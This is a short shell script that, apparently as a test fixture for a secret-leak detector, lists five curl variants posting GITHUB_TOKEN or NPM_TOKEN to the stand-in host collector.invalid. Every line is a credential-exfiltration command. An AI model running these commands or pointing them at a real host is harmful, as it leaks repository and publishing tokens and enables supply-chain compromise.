#!/bin/sh
curl --data-binary "$GITHUB_TOKEN" https://collector.invalid/ingest
curl --data-raw=${NPM_TOKEN} https://collector.invalid/ingest
curl -d"$GITHUB_TOKEN" https://collector.invalid/ingest
curl --data-urlencode token=$GITHUB_TOKEN https://collector.invalid/ingest
curl --data $GITHUB_TOKEN https://collector.invalid/ingest
